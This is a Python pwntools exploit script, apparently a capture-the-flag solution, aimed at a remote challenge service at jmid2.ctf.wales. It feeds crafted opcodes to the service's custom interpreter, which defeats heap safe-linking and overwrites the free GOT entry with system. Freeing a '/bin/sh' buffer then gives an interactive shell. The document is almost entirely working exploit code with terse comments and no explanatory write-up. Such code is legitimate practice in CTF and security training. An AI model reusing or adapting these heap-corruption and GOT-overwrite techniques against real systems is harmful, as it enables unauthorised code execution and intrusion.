from pwn import *


context.binary = exe =  ELF("./a.out")
context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]

p = remote("jmid2.ctf.wales", 1337)
#p = process(exe.path)

#gdb.attach(p,gdbscript="b *ParseJMID2+2233\nc")

def CPY(dest,data):
    assert len(data) == 8
    return b"\x00"+bytes([dest])+data
def DEL(dest):
    return b"\x01"+bytes([dest])
def XOR(dest,src1,src2):
    return b"\x02"+bytes([dest,src1,src2])
def AND(dest,src1,src2):
    return b"\x04"+bytes([dest,src1,src2])

payload = b""
print(p64(exe.got["free"]).hex())
payload += CPY(0,p64(0x123))
payload += CPY(1,p64(0x123))
payload += CPY(2,p64(0xffffffffffffff00))
payload += CPY(3,p64(0xf5a00)) #libc free^system
payload += DEL(0)
payload += DEL(1)
payload += XOR(1,0,1) # xor safelink
payload += AND(1,1,2) # clear 2 lowest bytes
payload += XOR(1,0,1) # xor safelink

#Address we write in 1 can now be derefed in 0
payload += CPY(0,p64(0x444))
payload += CPY(1,p64(exe.got["free"])) # 1 now points to jm struct 0

payload += XOR(0,0,3) # xor free@got with 3 to get system

payload += CPY(4,b"/bin/sh\x00")
payload += DEL(4)

#PADDING may need padding as size of payload changes heap layout
#payload += CPY(6,p64(0x123))
#payload += CPY(6,p64(0x123))
#payload += DEL(6)

print(len(payload))
p.sendline(str(len(payload.hex())//2).encode())
p.sendline(payload.hex())
p.interactive()
